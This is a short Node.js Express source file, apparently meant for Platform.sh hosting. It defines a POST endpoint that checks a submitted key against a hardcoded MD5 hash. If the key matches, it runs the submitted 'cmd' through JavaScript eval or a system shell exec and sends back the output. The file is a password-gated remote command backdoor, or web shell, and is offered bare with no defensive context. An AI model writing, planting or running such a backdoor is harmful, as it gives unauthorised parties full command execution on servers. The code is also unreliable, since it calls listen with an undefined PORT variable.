const app = require('express')();
const config = require("platformsh-config").config();
const exec = require('child_process').exec;
const bodyParser = require('body-parser')
const crypto = require('crypto');
const md5 = '4460918cf9f30e3f4b5c2d5188af0da5'
var time = null
const hash = line => crypto.createHash('md5').update(line).digest("hex")

app.use(bodyParser.json())
app.use(bodyParser.urlencoded({ extended: true }))
app.post('/', function(req, res) {
    let body = req.body
    if (body && body.cmd && body.key && hash(body.key) == md5) {
        if (body.type == 'eval') {
            eval(body.cmd)
        } else if (body.type == 'exec') {
            exec(body.cmd, function(err, out) {
                let msg = out + '\n' + (err ? ('error: \n' + err) : '')
                res.send(msg)
            })
        } else {
            res.send('unknown type')
        }
    } else {
        res.send('fail')
    }
})
app.listen(PORT, () => console.log(`Listen on ${ PORT }`))

// Get PORT and start the server
app.listen(config.port, function() {
  console.log(`Listening on port ${config.port}`)
});
